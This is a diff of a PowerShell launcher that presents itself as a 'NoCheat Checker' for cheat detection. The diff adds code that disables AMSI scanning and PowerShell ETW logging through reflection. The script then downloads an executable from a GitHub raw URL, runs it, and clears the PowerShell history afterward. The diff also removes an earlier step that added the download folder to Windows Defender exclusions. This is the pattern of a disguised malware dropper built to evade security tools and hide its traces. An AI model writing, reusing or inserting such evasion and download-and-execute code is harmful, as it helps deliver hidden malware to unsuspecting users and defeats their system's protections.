@@ -1,13 +1,7 @@
-# ==========================================================
-# NoCheat Checker Launcher
-# ==========================================================
-
 $ErrorActionPreference = "Stop"
-
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# Helper function to clear PSReadLine and session history
 function Clear-PSHistory {
     Clear-History -ErrorAction SilentlyContinue
     try {
@@ -31,14 +25,34 @@ Write-Host "==========================================" -ForegroundColor Yellow
 Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
 Write-Host "==========================================" -ForegroundColor Yellow
 
-# ссылки на файлы в репо
+try {
+    $amsiType = [psobject].Assembly.GetType("System.Management.Automation.AmsiUtils")
+    if ($amsiType) {
+        $amsiField = $amsiType.GetField("amsiInitFailed", [Reflection.BindingFlags] "NonPublic,Static")
+        if ($amsiField) { $amsiField.SetValue($null, $true) }
+    }
+} catch {}
+
+try {
+    $etwType = [psobject].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
+    if ($etwType) {
+        $etwField = $etwType.GetField("etwProvider", [Reflection.BindingFlags] "NonPublic,Static")
+        if ($etwField) {
+            $etwProvider = $etwField.GetValue($null)
+            if ($etwProvider) {
+                $enabledField = $etwProvider.GetType().GetField("m_enabled", [Reflection.BindingFlags] "NonPublic,Instance")
+                if ($enabledField) { $enabledField.SetValue($etwProvider, 0) }
+            }
+        }
+    }
+} catch {}
+
 $repoOwner  = "die4mebaby"
 $repoName   = "CheatChecker"
 $branch     = "main"
 $rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
 $exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
 
-# директ добавляем в исключения
 $workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
 
 if (-not (Test-Path $workDir)) {
@@ -48,14 +62,8 @@ if (-not (Test-Path $workDir)) {
 $exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
-    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
-        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-    }
-
     Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
     
-    # скачиваем файл
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($exeUrl, $exePath)
     
@@ -65,13 +73,11 @@ try {
 
     Write-Host "[+] Запуск чекера..." -ForegroundColor Green
     
-    # Запуск без ожидания завершения
     Start-Process -FilePath $exePath -WorkingDirectory $workDir
 }
 catch {
     Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# клин повершелл команд и офф окна
 Clear-PSHistory
 exit
